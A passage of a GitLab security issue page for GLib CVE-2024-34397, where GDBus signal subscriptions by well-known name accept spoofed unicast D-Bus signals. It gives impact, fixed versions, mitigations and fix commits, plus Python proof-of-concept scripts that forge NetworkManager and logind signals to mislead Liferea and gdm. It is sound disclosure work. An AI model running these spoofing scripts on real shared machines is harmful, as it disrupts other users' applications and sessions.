class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e        \u003cspan class=\&quot;k\&quot;\u003ethis\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003e_pipelineConfigs\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003ethis\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003e_getPipelineConfigs\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e();\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e        \u003cspan class=\&quot;k\&quot;\u003ethis\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003e_tryNextPipeline\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e();\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e    \u003cspan class=\&quot;p\&quot;\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;292:1-292:206\&quot; dir=\&quot;auto\&quot;\u003eI was very confused that the screen recording application (which internally uses GDBusProxy through GJS and GObject-introspection) was able to handle the signal despite listening for the wrong service name.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;294:1-294:102\&quot; dir=\&quot;auto\&quot;\u003eThe signal delivery turned out to only be possible due to a number of coincidences including this bug.\u003c/p\u003e&quot;,&quot;initialDescriptionText&quot;:&quot;## Vulnerability summary\n\nAlicia Boya García discovered a security issue in GLib&#39;s `GDBusConnection`. When subscribing to a D-Bus signal using a well-known name such as `com.example.Foo`, the signal subscription mechanism did not check that the sender of the signal was genuinely the owner of the desired name.\n\nCVE-2024-34397 has been allocated for this vulnerability.\n\n### Impact\n\nWhen a GDBus-based client subscribes to signals from a trusted system service such as NetworkManager or systemd-logind on a shared computer, other users of the same computer can send spoofed D-Bus signals that the GDBus-based client will wrongly interpret as having been sent by the trusted system service. This could lead to the GDBus-based client behaving incorrectly, with an application-dependent impact.\n\n### Fixed versions\n\nPlease note that initial fixes for this vulnerability caused a regression for users of ibus (#3353) which should also be addressed by distributors.\n\n* GLib 2.80.x ≥ 2.80.1 (stable branch) by !4039; regression fix for #3353 in 2.80.2 via !4055 \n* GLib 2.78.x ≥ 2.78.5 (old stable branch) by !4040; regression fix for #3353 in 2.78.6 via !4056 \n* GLib ≥ 2.81.0 (development branch) by !4038; regression fix for #3353 via !4053\n\nOlder branches such as 2.76.x are EOL and will not receive new upstream releases, but downstream distributions are likely to backport the fixes.\n\n### Vulnerable versions\n\n* GLib 2.80.x before 2.80.1\n* all versions before 2.78.5\n\n### Workarounds/mitigations\n\nSubscribing to a signal by its sender&#39;s D-Bus unique name (such as `:1.42`) is not affected.\n\nSubscribing to a signal from the D-Bus message bus by its name `org.freedesktop.DBus` is not affected. This is a special name defined by the D-Bus protocol, which has the syntax of a well-known name, but behaves like a unique name (and in particular can appear in the sender field of a message).\n\nPrograms that use `g_dbus_connection_signal_subscribe()` for a well-known name such as `com.example.Foo` could mitigate this vulnerability by tracking the current owner of the well-known name themselves, for example by using `g_bus_watch_name()`, and ignoring any calls to the `GDBusSignalCallback` where the `sender_name` does not match the name&#39;s current owner.\n\n### Fixes\n\nFixing this vulnerability requires multiple changes to GLib:\n\n* 1e648b67 \&quot;gdbusprivate: Add symbolic constants for the message bus itself\&quot;\n* 8dfea560 \&quot;gdbusconnection: Move SignalData, SignalSubscriber higher up\&quot;\n* 816da605 \&quot;gdbusconnection: Factor out signal_data_new_take()\&quot;\n* 5d7ad689 \&quot;gdbusconnection: Factor out add_signal_data()\&quot;\n* 7d21b719 \&quot;gdbusconnection: Factor out remove_signal_data_if_unused\&quot;\n* 26a3fb85 \&quot;gdbusconnection: Stop storing sender_unique_name in SignalData\&quot;\n* 683b14b9 \&quot;gdbus: Track name owners for signal subscriptions\&quot;\n* d4b65376 \&quot;gdbusconnection: Don&#39;t deliver signals if the sender doesn&#39;t match\&quot;\n* 7d65f6c5 \&quot;gdbusconnection: Allow name owners to have the syntax of a well-known name\&quot; (regression fix, see #3353; added in 2.80.2)\n\nThe bug fix commits 10e9a917 \&quot;gdbusmessage: Cache the arg0 value\&quot; and 7b15b1db \&quot;gdbus-proxy test: Wait before asserting name owner has gone away\&quot; are not required to fix the vulnerability, but applying them in addition is recommended. When applying the vulnerability fix without those commits, GLib test failures were observed.\n\nWhen backporting to older stable release branches, a backport of `g_set_str()` will be required, for example 67052fed \&quot;gdbusconnection: Make a backport of g_set_str() available\&quot; in !4041.\n\nFixing this vulnerability will trigger a regression in GNOME Shell&#39;s implementation of screen recording and screencasting, due to a pre-existing GNOME Shell bug. Applying commit GNOME/gnome-shell@50a011a1 \&quot;screencast: Correct expected bus name for streams\&quot; to GNOME Shell fixes that regression. In distributions that ship GNOME Shell, it is recommended to make that change as part of the same security update that fixes the GLib vulnerability.\n\n!4041 and !4042 contain unofficial backports to GLib 2.74.x (for Debian 12) and 2.66.x (for Debian 11) which other distributors might find useful as a starting point.\n\n#### Test coverage\n\n* 124b4571 \&quot;tests: Add a data-driven test for signal subscriptions\&quot;\n* 14c3d693 \&quot;tests: Add support for subscribing to signals from a well-known name\&quot;\n* 984354e0 \&quot;tests: Add a test-case for what happens if a unique name doesn&#39;t exist\&quot;\n* fd265663 \&quot;tests: Add test coverage for signals that match the message bus&#39;s name\&quot;\n* fc0ee920 \&quot;tests: Add a test for matching by two well-known names\&quot;\n* f6d1b547 \&quot;tests: Add a test for signal filtering by well-known name\&quot;\n* 96e3190a \&quot;tests: Ensure that unsubscribing with GetNameOwner in-flight doesn&#39;t crash\&quot;\n\nThese tests are included in !4038, !4039, !4040, !4041, !4042.\n\n---\n\n## Original report\n\nGDBus subscriptions to well-known services are vulnerable to unicast spoofing\n\nWhen `g_dbus_connection_signal_subscribe()` is called with a well-known bus service name (e.g. `org.freedesktop.login1`) as value for the `sender` argument, the following occurs:\n\n1. `args_to_rule()` is called, creating a D-Bus match rule string that contains the well-known name.\n2. The local variable `sender_unique_name` is set to `\&quot;\&quot;`, as it is a well-known name rather than a unique name.\n3. The `map_rule_to_signal_data` hash table is used to look for a previous `SignalData` structure for that exact rule string. Let&#39;s assume none exist.\n4. A `SignalData` structure is created with the well-known name as `sender` and empty string as `sender_unique_name`, then a pointer to the `SignalData` is stored in `map_rule_to_signal_data` for future occurrences.\n5. An `AddMatch` message is sent to `org.freedesktop.DBus` with the rule string.\n6. A pointer to `SignalData` is stored in `map_sender_unique_name_to_signal_data_array` with key `signal_data-\u003esender_unique_name`, **hence empty string**.\n\nLater, the process may receive a D-Bus signal.\n\n1. `distribute_signals()` gets called with the signal message.\n2. `map_sender_unique_name_to_signal_data_array` is queried with the unique name of the sender of the signal as key. Nothing is found.\n3. `map_sender_unique_name_to_signal_data_array` is queried with the empty string as key and `schedule_callbacks()` is called on the entries.\n4. `schedule_callbacks()` iterates through the array of `SignalData*` discarding `SignalData` structures where either:\n\n   a) The interface name doesn&#39;t match.\n\n   b) The member (i.e. signal name) doesn&#39;t match.\n\n   c) The object path doesn&#39;t match.\n\n   d) The signal arguments don&#39;t match.\n\n5. The signal callback is called without any further verification.\n\n**Notice that \&quot;The sender doesn&#39;t match\&quot; is not along these checks.** GDBus assumes that either has already been checked by indexing `map_sender_unique_name_to_signal_data_array` (which is only true for well-known names and `org.freedesktop.DBus`) or that the D-Bus broker wouldn&#39;t send such a message due to it being filtered by the match rule. However, there is at least one case described in the D-Bus specification in which this is not sufficient:\n\n\u003e Messages may have a DESTINATION field (see the section called “Header Fields”), resulting in a unicast message. If the DESTINATION field is present, it specifies a message recipient by name. Method calls and replies normally specify this field. **The message bus must send messages (of any type) with the DESTINATION field set to the specified recipient, regardless of whether the recipient has set up a match rule matching the message.**\n\nTherefore, an attacker on the same bus, even if unable to own any well-known names as it&#39;s the case by default in the SYSTEM bus, can construct a unicast DBus signal message with `DESTINATION` being the targeted application and send a signal with identical interface name, member, object path and matching arguments in order to spoof a D-Bus service with a well-known name. \n\nThe signal will trigger the invocation of the callback and it would be up to the application to validate the `sender` argument and not blindly trust the received signal arguments. This is a problem when the application passed a well-known service name as the `sender` argument for `g_dbus_connection_signal_subscribe()` expecting GDBus -- somewhat reasonably -- to do this filtering on its behalf.\n\ng_dbus_connection_signal_subscribe() is also used internally by GDBus, maybe most notably by GDBusProxy.  Fortunately there is this additional check in `gdbusproxy.c`:\n\n```c\nstatic void\non_signal_received (GDBusConnection *connection,\n                    const gchar     *sender_name,\n                    const gchar     *object_path,\n                    const gchar     *interface_name,\n                    const gchar     *signal_name,\n                    GVariant        *parameters,\n                    gpointer         user_data)\n{\n  GWeakRef *proxy_weak = user_data;\n  GDBusProxy *proxy;\n\n  proxy = G_DBUS_PROXY (g_weak_ref_get (proxy_weak));\n  // ...\n  if (proxy-\u003epriv-\u003ename_owner != NULL \u0026\u0026 g_strcmp0 (sender_name, proxy-\u003epriv-\u003ename_owner) != 0)\n    {\n      // ...\n      goto out;\n    }\n```\n\nThanks to that additional check, users of GDBusProxy (e.g. those making use of the GLib signals `&#39;g-signal&#39;` and `&#39;g-properties-changed&#39;` instead of calling `g_dbus_connection_signal_subscribe()` for signal subscriptions) are not affected unless `proxy-\u003epriv-\u003ename_owner` is NULL, which will only happen if the provided well-known name doesn&#39;t exist in the bus.\n\n## Proof of concept\n\nFor a harmless proof of concept targetting the system bus, let&#39;s impersonate NetworkManager to convince the RSS reader Liferea that we are offline when we&#39;re actually online, or vice versa. The following is Python code. The packages dbus-fast and psutil must be installed and Liferea must be running.\n\n```python\nfrom dbus_fast import BusType, Message\nfrom dbus_fast.signature import Variant\nfrom dbus_fast.aio.message_bus import MessageBus\n\nimport asyncio\nimport psutil\n\nasync def find_bus_service_with_process_string(bus: MessageBus, process_str: str) -\u003e str:\n    dbus_introspection = await bus.introspect(\n        \&quot;org.freedesktop.DBus\&quot;, \&quot;/org/freedesktop/DBus\&quot;)\n    dbus_proxy = bus.get_proxy_object(\n        \&quot;org.freedesktop.DBus\&quot;, \&quot;/org/freedesktop/DBus\&quot;,\n        dbus_introspection)\n    dbus_iface = dbus_proxy.get_interface(\&quot;org.freedesktop.DBus\&quot;)\n    # Check the connections one by one to find the target\n    for service_name in await dbus_iface.call_list_names():\n        pid = await dbus_iface.call_get_connection_unix_process_id(service_name)\n        cmdline = &#39; &#39;.join(psutil.Process(pid).cmdline())\n        if process_str in cmdline:\n            return service_name\n\nNM_STATE_DISCONNECTED = 20\nNM_STATE_CONNECTED_GLOBAL = 70\n\nasync def main():\n    bus = await MessageBus(bus_type=BusType.SYSTEM).connect()\n    victim_bus_user = await find_bus_service_with_process_string(bus,\n        \&quot;/liferea\&quot;)\n    malicious_msg = Message.new_signal(\n        path=\&quot;/org/freedesktop/NetworkManager\&quot;,\n        interface=\&quot;org.freedesktop.NetworkManager\&quot;,\n        member=\&quot;StateChanged\&quot;,\n        signature=\&quot;u\&quot;,\n        body=[\n            NM_STATE_DISCONNECTED\n        ],\n    )\n    malicious_msg.destination = victim_bus_user\n    await bus.send(malicious_msg)\n\nasyncio.run(main())\n```\n\nAfter running the script, try clicking in \&quot;Update all\&quot; in Liferea and you&#39;ll see \&quot;Liferea is in offline mode. No update is possible.\&quot; If you edit the script to send NM_STATE_CONNECTED_GLOBAL it will fetch news once again.\n\nThis is because Liferea uses g_dbus_connection_signal_subscribe() to listen for the StateChanged signal filtering by sender and then trusts the signals:\n\n```c\nself-\u003epriv-\u003esubscription_id = g_dbus_connection_signal_subscribe (self-\u003epriv-\u003econn,\n                                                                 \&quot;org.freedesktop.NetworkManager\&quot;,\n                                                                 \&quot;org.freedesktop.NetworkManager\&quot;,\n                                                                 \&quot;StateChanged\&quot;,\n                                                                 NULL,\n                                                                 NULL,\n                                                                 G_DBUS_SIGNAL_FLAGS_NONE,\n                                                                 on_network_state_changed_cb,\n                                                                 self,\n                                                                 NULL);\n```\n\n```c\nstatic void\non_network_state_changed_cb (GDBusConnection *connection,\n\t\t\t     const gchar *sender_name,\n\t\t\t     const gchar *object_path,\n\t\t\t     const gchar *interface_name,\n\t\t\t     const gchar *signal_name,\n\t\t\t     GVariant *parameters,\n\t\t\t     gpointer user_data)\n{\n\tgboolean online = network_monitor_is_online ();\n\tguint state;\n\n\tg_variant_get (parameters, \&quot;(u)\&quot;, \u0026state);\n\n\tif (online \u0026\u0026 !is_nm_connected (state)) {\n\t\tdebug (DEBUG_NET, \&quot;network manager: no network connection -\u003e going offline\&quot;);\n\t\tnetwork_monitor_set_online (FALSE);\n\t} else if (!online \u0026\u0026 is_nm_connected (state)) {\n\t\tdebug (DEBUG_NET, \&quot;network manager: active connection -\u003e going online\&quot;);\n\t\tnetwork_monitor_set_online (TRUE);\n\t}\n}\n```\n\nThis approach can be used to impersonate any system bus service. For instance, the following attacks gdm impersonating logind:\n\n```python\nvictim_bus_user = await find_bus_service_with_process_string(\n   bus, \&quot;/usr/bin/gdm\&quot;)\nmalicious_msg = Message.new_signal(\n    path=\&quot;/org/freedesktop/login1\&quot;,\n    interface=\&quot;org.freedesktop.login1.Manager\&quot;,\n    member=\&quot;SeatRemoved\&quot;,\n    signature=\&quot;so\&quot;,\n    body=[\n        \&quot;seat0\&quot;,\n        \&quot;/org/freedesktop/login1/seat/seat0\&quot;\n    ])\n```\n\nBy using D-Feet you can see the D-Bus tree for org.gnome.DisplayManager and how if you run that script, the entry under /org/gnome/DisplayManager/Displays/ is deleted as GDM uses g_dbus_connection_signal_subscribe() to handle the \&quot;SeatRemoved\&quot; signals:\n\n```c\nstatic void\non_seat_removed (GDBusConnection *connection,\n                 const gchar     *sender_name,\n                 const gchar     *object_path,\n                 const gchar     *interface_name,\n                 const gchar     *signal_name,\n                 GVariant        *parameters,\n                 gpointer         user_data)\n{\n        const char *seat;\n\n        g_variant_get (parameters, \&quot;(\u0026s\u0026o)\&quot;, \u0026seat, NULL);\n        delete_display (GDM_LOCAL_DISPLAY_FACTORY (user_data), seat);\n}\n```\n\n```c\nfactory-\u003eseat_removed_id = g_dbus_connection_signal_subscribe (factory-\u003econnection,\n                                                              \&quot;org.freedesktop.login1\&quot;,\n                                                              \&quot;org.freedesktop.login1.Manager\&quot;,\n                                                              \&quot;SeatRemoved\&quot;,\n                                                              \&quot;/org/freedesktop/login1\&quot;,\n                                                              NULL,\n                                                              G_DBUS_SIGNAL_FLAGS_NONE,\n                                                              on_seat_removed,\n                                                              g_object_ref (factory),\n                                                              g_object_unref);\n```\n\n## Discovery\n\nI found this bug after finding a typo in one of the D-Bus strings of gnome-shell screen recording.\n\n```js\nthis._streamProxy = new ScreenCastStreamProxy(Gio.DBus.session,\n    &#39;org.gnome.ScreenCast.Stream&#39;, // \u003c-- should be &#39;org.gnome.Mutter.ScreenCast.Stream&#39;\n    streamPath);\n\nthis._streamProxy.connectSignal(&#39;PipeWireStreamAdded&#39;,\n    (_proxy, _sender, params) =\u003e {\n        const [nodeId] = params;\n        this._nodeId = nodeId;\n\n        this._pipelineState = PipelineState.STARTING;\n        this._pipelineConfigs = this._getPipelineConfigs();\n        this._tryNextPipeline();\n    });\n```\n\nI was very confused that the screen recording application (which internally uses GDBusProxy through GJS and GObject-introspection) was able to handle the signal despite listening for the wrong service name.\n\nThe signal delivery turned out to only be possible due to a number of coincidences including this bug.&quot;,&quot;initialTaskCompletionStatus&quot;:{&quot;count&quot;:0,&quot;completed_count&quot;:0},&quot;canCreateIncident&quot;:false,&quot;fullPath&quot;:&quot;GNOME/glib&quot;,&quot;iid&quot;:3268,&quot;issuableId&quot;:195110,&quot;issueType&quot;:&quot;issue&quot;,&quot;isHidden&quot;:false,&quot;zoomMeetingUrl&quot;:null,&quot;authorId&quot;:8744,&quot;authorName&quot;:&quot;Alicia Boya García&quot;,&quot;authorUsername&quot;:&quot;ntrrgc&quot;,&quot;authorWebUrl&quot;:&quot;/ntrrgc&quot;,&quot;createdAt&quot;:&quot;2024-02-24T15:43:04+00:00&quot;,&quot;isFirstContribution&quot;:false,&quot;serviceDeskReplyTo&quot;:null,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;signInPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;projectPath&quot;:&quot;glib&quot;,&quot;projectId&quot;:658,&quot;projectNamespace&quot;:&quot;GNOME&quot;,&quot;updatedAt&quot;:&quot;2024-05-08T15:03:53+00:00&quot;,&quot;updatedBy&quot;:{&quot;name&quot;:&quot;Simon McVittie&quot;,&quot;path&quot;:&quot;/smcv&quot;}}" id="js-issuable-app">
<div class="title-container">
<h1 class="gl-heading-1 !gl-m-0">CVE-2024-34397: GDBus signal subscriptions for well-known names are vulnerable to unicast spoofing</h1>
</div>
<div class="description">
<div class="md"><h2 data-sourcepos="1:1-1:24" dir="auto">&#x000A;<a id="user-content-vulnerability-summary" class="anchor" href="#vulnerability-summary" aria-hidden="true"></a>Vulnerability summary</h2>&#x000A;<p data-sourcepos="3:1-3:285" dir="auto">Alicia Boya García discovered a security issue in GLib's <code data-sourcepos="3:60-3:74">GDBusConnection</code>. When subscribing to a D-Bus signal using a well-known name such as <code data-sourcepos="3:146-3:160">com.example.Foo</code>, the signal subscription mechanism did not check that the sender of the signal was genuinely the owner of the desired name.</p>&#x000A;<p data-sourcepos="5:1-5:57" dir="auto">CVE-2024-34397 has been allocated for this vulnerability.</p>&#x000A;<h3 data-sourcepos="7:1-7:10" dir="auto">&#x000A;<a id="user-content-impact" class="anchor" href="#impact" aria-hidden="true"></a>Impact</h3>&#x000A;<p data-sourcepos="9:1-9:408" dir="auto">When a GDBus-based client subscribes to signals from a trusted system service such as NetworkManager or systemd-logind on a shared computer, other users of the same computer can send spoofed D-Bus signals that the GDBus-based client will wrongly interpret as having been sent by the trusted system service. This could lead to the GDBus-based client behaving incorrectly, with an application-dependent impact.</p>&#x000A;<h3 data-sourcepos="11:1-11:18" dir="auto">&#x000A;<a id="user-content-fixed-versions" class="anchor" href="#fixed-versions" aria-hidden="true"></a>Fixed versions</h3>&#x000A;<p data-sourcepos="13:1-13:147" dir="auto">Please note that initial fixes for this vulnerability caused a regression for users of ibus (<a href="/GNOME/glib/-/issues/3353" data-reference-type="issue" data-original="#3353" data-link="false" data-link-reference="false" data-project="658" data-issue="199972" data-project-path="GNOME/glib" data-iid="3353" data-issue-type="issue" data-container="body" data-placement="top" title="Fixing CVE-2024-34397 caused regressions for ibus" class="gfm gfm-issue">#3353 (closed)</a>) which should also be addressed by distributors.</p>&#x000A;<ul data-sourcepos="15:1-18:0" dir="auto">&#x000A;<li data-sourcepos="15:1-15:96">GLib 2.80.x ≥ 2.80.1 (stable branch) by <a href="/GNOME/glib/-/merge_requests/4039" data-reference-type="merge_request" data-original="!4039" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92487" data-project-path="GNOME/glib" data-iid="4039" data-container="body" data-placement="top" title="Backport !4038 “gdbusconnection: Don't deliver signals if the sender doesn't match” to glib-2-80" class="gfm gfm-merge_request">!4039 (merged)</a>; regression fix for <a href="/GNOME/glib/-/issues/3353" data-reference-type="issue" data-original="#3353" data-link="false" data-link-reference="false" data-project="658" data-issue="199972" data-project-path="GNOME/glib" data-iid="3353" data-issue-type="issue" data-container="body" data-placement="top" title="Fixing CVE-2024-34397 caused regressions for ibus" class="gfm gfm-issue">#3353 (closed)</a> in 2.80.2 via <a href="/GNOME/glib/-/merge_requests/4055" data-reference-type="merge_request" data-original="!4055" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92548" data-project-path="GNOME/glib" data-iid="4055" data-container="body" data-placement="top" title="Backport !4053 “gdbusconnection: Allow name owners to have the syntax of a well-known name” to glib-2-80" class="gfm gfm-merge_request">!4055 (merged)</a>&#x000A;</li>&#x000A;<li data-sourcepos="16:1-16:100">GLib 2.78.x ≥ 2.78.5 (old stable branch) by <a href="/GNOME/glib/-/merge_requests/4040" data-reference-type="merge_request" data-original="!4040" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92488" data-project-path="GNOME/glib" data-iid="4040" data-container="body" data-placement="top" title="Backport !4038 “gdbusconnection: Don't deliver signals if the sender doesn't match” to glib-2-78" class="gfm gfm-merge_request">!4040 (merged)</a>; regression fix for <a href="/GNOME/glib/-/issues/3353" data-reference-type="issue" data-original="#3353" data-link="false" data-link-reference="false" data-project="658" data-issue="199972" data-project-path="GNOME/glib" data-iid="3353" data-issue-type="issue" data-container="body" data-placement="top" title="Fixing CVE-2024-34397 caused regressions for ibus" class="gfm gfm-issue">#3353 (closed)</a> in 2.78.6 via <a href="/GNOME/glib/-/merge_requests/4056" data-reference-type="merge_request" data-original="!4056" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92549" data-project-path="GNOME/glib" data-iid="4056" data-container="body" data-placement="top" title="Backport !4053 “gdbusconnection: Allow name owners to have the syntax of a well-known name” to glib-2-78" class="gfm gfm-merge_request">!4056 (merged)</a>&#x000A;</li>&#x000A;<li data-sourcepos="17:1-18:0">GLib ≥ 2.81.0 (development branch) by <a href="/GNOME/glib/-/merge_requests/4038" data-reference-type="merge_request" data-original="!4038" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92486" data-project-path="GNOME/glib" data-iid="4038" data-container="body" data-placement="top" title="gdbusconnection: Don't deliver signals if the sender doesn't match" class="gfm gfm-merge_request">!4038 (merged)</a>; regression fix for <a href="/GNOME/glib/-/issues/3353" data-reference-type="issue" data-original="#3353" data-link="false" data-link-reference="false" data-project="658" data-issue="199972" data-project-path="GNOME/glib" data-iid="3353" data-issue-type="issue" data-container="body" data-placement="top" title="Fixing CVE-2024-34397 caused regressions for ibus" class="gfm gfm-issue">#3353 (closed)</a> via <a href="/GNOME/glib/-/merge_requests/4053" data-reference-type="merge_request" data-original="!4053" data-link="false" data-link-reference="false" data-project="658" data-merge-request="92537" data-project-path="GNOME/glib" data-iid="4053" data-container="body" data-placement="top" title="gdbusconnection: Allow name owners to have the syntax of a well-known name" class="gfm gfm-merge_request">!4053 (merged)</a>&#x000A;</li>&#x000A;</ul>&#x000A;<p data-sourcepos="19:1-19:144" dir="auto">Older branches such as 2.76.x are EOL and will not receive new upstream releases, but downstream distributions are likely to backport the fixes.</p>&#x000A;<h3 data-sourcepos="21:1-21:23" dir="auto">&#x000A;<a id="user-content-vulnerable-versions" class="anchor" href="#vulnerable-versions" aria-hidden="true"></a>Vulnerable versions</h3>&#x000A;<ul data-sourcepos="23:1-25:0" dir="auto">&#x000A;<li data-sourcepos="23:1-23:27">GLib 2.80.x before 2.80.1</li>&#x000A;<li data-sourcepos="24:1-25:0">all versions before 2.78.5</li>&#x000A;</ul>&#x000A;<h3 data-sourcepos="26:1-26:27" dir="auto">&#x000A;<a id="user-content-workaroundsmitigations" class="anchor" href="#workaroundsmitigations" aria-hidden="true"></a>Workarounds/mitigations</h3>&#x000A;<p data-sourcepos="28:1-28:92" dir="auto">Subscribing to a signal by its sender's D-Bus unique name (such as <code data-sourcepos="28:69-28:73">:1.42</code>) is not affected.</p>&#x000A;<p data-sourcepos="30:1-30:295" dir="auto">Subscribing to a signal from the D-Bus message bus by its name <code data-sourcepos="30:65-30:84">org.freedesktop.DBus</code> is not affected. This is a special name defined by the D-Bus protocol, which has the syntax of a well-known name, but behaves like a unique name (and in particular can appear in the sender field of a message).</p>&#x000A;<p data-sourcepos="32:1-32:363" dir="auto">Programs that use <code data-sourcepos="32:20-32:55">g_dbus_connection_signal_subscribe()</code> for a well-known name such as <code data-sourcepos="32:89-32:103">com.example.Foo</code> could mitigate this vulnerability by tracking the current owner of the well-known name themselves, for example by using <code data-sourcepos="32:227-32:244">g_bus_watch_name()</code>, and ignoring any calls to the <code data-sourcepos="32:279-32:297">GDBusSignalCallback</code> where the <code data-sourcepos="32:311-32:321">sender_name</code> does not match the name's current owner.</p>&#x000A;<h3 data-sourcepos="34:1-34:9" dir="auto">&#x000A;<a id="user-content-fixes" class="anchor" href="#fixes" aria-hidden="true"></a>Fixes</h3>&#x000A;<p data-sourcepos="36:1-36:60" dir="auto">Fixing this vulnerability requires multiple changes to GLib:</p>&#x000A;<ul data-sourcepos="38:1-47:0" dir="auto">&#x000A;<li data-sourcepos="38:1-38:76">&#x000A;<a href="/GNOME/glib/-/commit/1e648b677f16d25e9f04c1c154904ad3290870f9" data-reference-type="commit" data-original="1e648b67" data-link="false" data-link-reference="false" data-project="658" data-commit="1e648b677f16d25e9f04c1c154904ad3290870f9" data-container="body" data-placement="top" title="gdbusprivate: Add symbolic constants for the message bus itself" class="gfm gfm-commit has-tooltip">1e648b67</a> "gdbusprivate: Add symbolic constants for the message bus itself"</li>&#x000A;<li data-sourcepos="39:1-39:73">&#x000A;<a href="/GNOME/glib/-/commit/8dfea5609e077089311d726e0eb2e186bc0214af" data-reference-type="commit" data-original="8dfea560" data-link="false" data-link-reference="false" data-project="658" data-commit="8dfea5609e077089311d726e0eb2e186bc0214af" data-container="body" data-placement="top" title="gdbusconnection: Move SignalData, SignalSubscriber higher up" class="gfm gfm-commit has-tooltip">8dfea560</a> "gdbusconnection: Move SignalData, SignalSubscriber higher up"</li>&#x000A;<li data-sourcepos="40:1-40:63">&#x000A;<a href="/GNOME/glib/-/commit/816da60571ddf8cdc99c6feae60f1a0accd41593" data-reference-type="commit" data-original="816da605" data-link="false" data-link-reference="false" data-project="658" data-commit="816da60571ddf8cdc99c6feae60f1a0accd41593" data-container="body" data-placement="top" title="gdbusconnection: Factor out signal_data_new_take()" class="gfm gfm-commit has-tooltip">816da605</a> "gdbusconnection: Factor out signal_data_new_take()"</li>&#x000A;<li data-sourcepos="41:1-41:58">&#x000A;<a href="/GNOME/glib/-/commit/5d7ad6897cf4b6ec7321c78c06c610d2c01a1a5f" data-reference-type="commit" data-original="5d7ad689" data-link="false" data-link-reference="false" data-project="658" data-commit="5d7ad6897cf4b6ec7321c78c06c610d2c01a1a5f" data-container="body" data-placement="top" title="gdbusconnection: Factor out add_signal_data()" class="gfm gfm-commit has-tooltip">5d7ad689</a> "gdbusconnection: Factor out add_signal_data()"</li>&#x000A;<li data-sourcepos="42:1-42:69">&#x000A;<a href="/GNOME/glib/-/commit/7d21b719ed6dbe4bd10e098155c2db81cafd029c" data-reference-type="commit" data-original="7d21b719" data-link="false" data-link-reference="false" data-project="658" data-commit="7d21b719ed6dbe4bd10e098155c2db81cafd029c" data-container="body" data-placement="top" title="gdbusconnection: Factor out remove_signal_data_if_unused" class="gfm gfm-commit has-tooltip">7d21b719</a> "gdbusconnection: Factor out remove_signal_data_if_unused"</li>&#x000A;<li data-sourcepos="43:1-43:75">&#x000A;<a href="/GNOME/glib/-/commit/26a3fb8518c63e0e4248f7115cadb344aea5dcd1" data-reference-type="commit" data-original="26a3fb85" data-link="false" data-link-reference="false" data-project="658" data-commit="26a3fb8518c63e0e4248f7115cadb344aea5dcd1" data-container="body" data-placement="top" title="gdbusconnection: Stop storing sender_unique_name in SignalData" class="gfm gfm-commit has-tooltip">26a3fb85</a> "gdbusconnection: Stop storing sender_unique_name in SignalData"</li>&#x000A;<li data-sourcepos="44:1-44:62">&#x000A;<a href="/GNOME/glib/-/commit/683b14b98167b3fd7f91b2c29d2b0d661b5df534" data-reference-type="commit" data-original="683b14b9" data-link="false" data-link-reference="false" data-project="658" data-commit="683b14b98167b3fd7f91b2c29d2b0d661b5df534" data-container="body" data-placement="top" title="gdbus: Track name owners for signal subscriptions" class="gfm gfm-commit has-tooltip">683b14b9</a> "gdbus: Track name owners for signal subscriptions"</li>&#x000A;<li data-sourcepos="45:1-45:79">&#x000A;<a href="/GNOME/glib/-/commit/d4b65376512b40ed602119f7492e5eb27a423cbc" data-reference-type="commit" data-original="d4b65376" data-link="false" data-link-reference="false" data-project="658" data-commit="d4b65376512b40ed602119f7492e5eb27a423cbc" data-container="body" data-placement="top" title="gdbusconnection: Don't deliver signals if the sender doesn't match" class="gfm gfm-commit has-tooltip">d4b65376</a> "gdbusconnection: Don't deliver signals if the sender doesn't match"</li>&#x000A;<li data-sourcepos="46:1-47:0">&#x000A;<a href="/GNOME/glib/-/commit/7d65f6c5a20f67aa9a857d0f7b0bf5de4d75be9b" data-reference-type="commit" data-original="7d65f6c5" data-link="false" data-link-reference="false" data-project="658" data-commit="7d65f6c5a20f67aa9a857d0f7b0bf5de4d75be9b" data-container="body" data-placement="top" title="gdbusconnection: Allow name owners to have the syntax of a well-known name" class="gfm gfm-commit has-tooltip">7d65f6c5</a> "gdbusconnection: Allow name owners to have the syntax of a well-known name" (regression fix, see <a href="/GNOME/glib/-/issues/3353" data-reference-type="issue" data-original="#3353" data-link="false" data-link-reference="false" data-project="658" data-issue="199972" data-project-path="GNOME/glib" data-iid="3353" data-issue-type="issue" data-container="body" data-placement="top" title="Fixing CVE-2024-34397 caused regressions for ibus" class="gfm gfm-issue">#3353 (closed)</a>; added in 2.80.2)</li>&#x000A;</ul>&#x000A;<p data-sourcepos="48:1-48:327" dir="auto">The bug fix commits <a href="/GNOME/glib/-/commit/10e9a917be7fb92b6b27837ef7a7f1d0be6095d5" data-reference-type="commit" data-original="10e9a917" data-link="false" 